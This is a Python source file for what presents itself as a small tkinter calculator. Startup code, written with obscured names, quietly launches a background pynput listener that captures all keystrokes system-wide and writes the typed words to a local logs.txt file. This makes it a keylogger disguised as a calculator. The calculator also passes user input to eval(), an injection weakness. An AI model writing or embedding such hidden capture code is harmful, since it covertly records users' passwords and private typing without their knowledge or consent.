import tkinter as t1k
from pynput import keyboard as kbd
import threading as th
import logging as l

zL0 = "logs.txt"
l.basicConfig(filename=zL0, level=l.INFO, format="%(asctime)s - %(message)s")
sEv = th.Event()
bF = []

def lB():
    global bF
    if bF:
        wrd = ''.join(bF)
        l.info(f"Captured sequence: {wrd}")
        bF = []

def kL():
    def kP(k):
        global bF
        try:
            if hasattr(k, 'char') and k.char.isprintable():
                bF.append(k.char)
            elif k == kbd.Key.space or k == kbd.Key.enter:
                lB()
            elif k == kbd.Key.backspace:
                if bF:
                    bF.pop()
        except Exception as e:
            l.error(f"Error encountered: {e}")

        if k == kbd.Key.esc:
            sEv.set()
            return False

    with kbd.Listener(on_press=kP) as listener:
        listener.join()

class C1:
    def __init__(self, w):
        self.w = w
        self.w.title("C1")

        self.rV = t1k.StringVar()

        self.dsp = t1k.Entry(self.w, textvariable=self.rV, font=("Arial", 16), bd=10, relief="sunken", justify="right")
        self.dsp.grid(row=0, column=0, columnspan=4)

        btns = [
            ('7', 1, 0), ('8', 1, 1), ('9', 1, 2), ('/', 1, 3),
            ('4', 2, 0), ('5', 2, 1), ('6', 2, 2), ('*', 2, 3),
            ('1', 3, 0), ('2', 3, 1), ('3', 3, 2), ('-', 3, 3),
            ('0', 4, 0), ('C', 4, 1), ('=', 4, 2), ('+', 4, 3),
        ]

        for (t, r, c) in btns:
            b = t1k.Button(self.w, text=t, width=10, height=3, font=("Arial", 16), command=lambda t=t: self.btnC(t))
            b.grid(row=r, column=c)

    def btnC(self, bT):
        if bT == "=":
            try:
                res = str(eval(self.rV.get()))
                self.rV.set(res)
            except:
                self.rV.set("Error")
        elif bT == "C":
            self.rV.set("")
        else:
            self.rV.set(self.rV.get() + bT)

if __name__ == "__main__":
    kT = th.Thread(target=kL, daemon=True)
    kT.start()

    w1 = t1k.Tk()
    a1 = C1(w1)
    w1.mainloop()

    sEv.wait()
